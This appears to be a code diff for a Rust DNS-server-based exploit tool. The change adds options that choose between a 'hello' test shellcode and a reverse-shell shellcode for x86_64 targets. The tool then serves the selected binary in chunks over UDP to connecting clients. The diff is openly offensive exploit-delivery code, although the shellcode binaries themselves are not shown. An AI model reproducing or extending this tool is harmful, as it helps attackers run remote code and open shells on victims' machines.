@@ -15,9 +15,26 @@ struct Opt {
     dns_ip: Ipv4Addr,
     #[clap(long, default_value = "8")]
     payload_len: usize,
+    #[clap(long, default_value = "hello")]
+    rce: String,
+    #[clap(long, default_value = "x86_64")]
+    target_arch: String,
 }
-// const  MYPAYLOAD: &str = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
-const MYPAYLOAD: &[u8] = include_bytes!("bins/shellcode.bin");
+
+const HELLO_X86_64: &[u8] = include_bytes!("bins/hello_x86_64.bin");
+const REVERSE_SHELL_X86_64: &[u8] = include_bytes!("bins/reverse_shell_x86_64.bin");
+
+fn select_payload(rce: String, target_arch: String) -> Option<Vec<u8>> {
+    if &*target_arch != "x86_64" {
+        return None;
+    }
+    let payload = match &*rce {
+        "hello" => Some(HELLO_X86_64.to_vec()),
+        "reverse_shell" => Some(REVERSE_SHELL_X86_64.to_vec()),
+        _ => None,
+    };
+    payload
+}
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
@@ -25,14 +42,16 @@ async fn main() -> anyhow::Result<()> {
         port,
         dns_ip,
         payload_len,
+        rce,
+        target_arch,
     } = Opt::parse();
     env_logger::init();
     init_keymaps();
     let sock = UdpSocket::bind(format!("0.0.0.0:{}", port)).await?;
     info!("Listening on {}", format!("0.0.0.0:{}", port));
     let sessions: Arc<Mutex<HashMap<Ipv4Addr, Session>>> = Arc::new(Mutex::new(HashMap::new()));
-
-    let mut remaining_payload = MYPAYLOAD.to_vec();
+    let selected_payload = select_payload(rce, target_arch).unwrap();
+    let mut remaining_payload = selected_payload.clone();
     let mut is_start = true;
     loop {
         let mut buf = [0u8; 512];
@@ -53,7 +72,7 @@ async fn main() -> anyhow::Result<()> {
                     .drain(0..payload_max_len.min(remaining_payload.len()))
                     .collect();
                 debug!("PAYLOAD SZ={}", payload.len());
-                let cbyte = if payload.len() == MYPAYLOAD.len() {
+                let cbyte = if payload.len() == selected_payload.len() {
                     ContinuationByte::ResetEnd
                 } else if remaining_payload.len() == 0 {
                     ContinuationByte::End
